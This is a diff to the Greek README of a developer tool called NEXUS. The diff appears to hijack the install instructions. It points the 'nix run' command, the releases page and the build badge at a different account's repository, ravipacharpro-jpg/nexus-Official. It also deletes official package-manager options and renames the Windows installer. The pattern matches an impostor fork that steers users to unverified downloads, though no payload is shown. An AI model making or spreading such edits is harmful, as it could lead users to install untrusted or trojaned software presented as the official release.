@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # Διαχειριστές πακέτων
 npm i -g nexus-ai@latest        # ή bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS και Linux (προτείνεται, πάντα ενημερωμένο)
-brew install nexus              # macOS και Linux (επίσημος τύπος brew, λιγότερο συχνές ενημερώσεις)
-sudo pacman -S nexus            # Arch Linux (Σταθερό)
 paru -S nexus-bin               # Arch Linux (Τελευταία έκδοση από AUR)
 mise use -g nexus               # Οποιοδήποτε λειτουργικό σύστημα
-nix run nixpkgs#nexus           # ή github:anomalyco/nexus με βάση την πιο πρόσφατη αλλαγή από το dev branch
+nix run github:ravipacharpro-jpg/nexus-Official           # ή github:ravipacharpro-jpg/nexus-Official με βάση την πιο πρόσφατη αλλαγή από το dev branch
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # ή github:anomalyco/nexus με βάση την
 
 ### Εφαρμογή Desktop (BETA)
 
-Το NEXUS είναι επίσης διαθέσιμο ως εφαρμογή. Κατέβασε το απευθείας από τη [σελίδα εκδόσεων](https://github.com/anomalyco/nexus/releases) ή το [nexus.ai/download](https://nexus.ai/download).
+Το NEXUS είναι επίσης διαθέσιμο ως εφαρμογή. Κατέβασε το απευθείας από τη [σελίδα εκδόσεων](https://github.com/ravipacharpro-jpg/nexus-Official/releases) ή το [nexus.ai/download](https://nexus.ai/download).
 
 | Πλατφόρμα             | Λήψη                               |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm`, ή AppImage         |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -126,4 +119,3 @@ XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://nexus.ai/install | bash
 
 ---
 
-**Γίνε μέλος της κοινότητάς μας** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
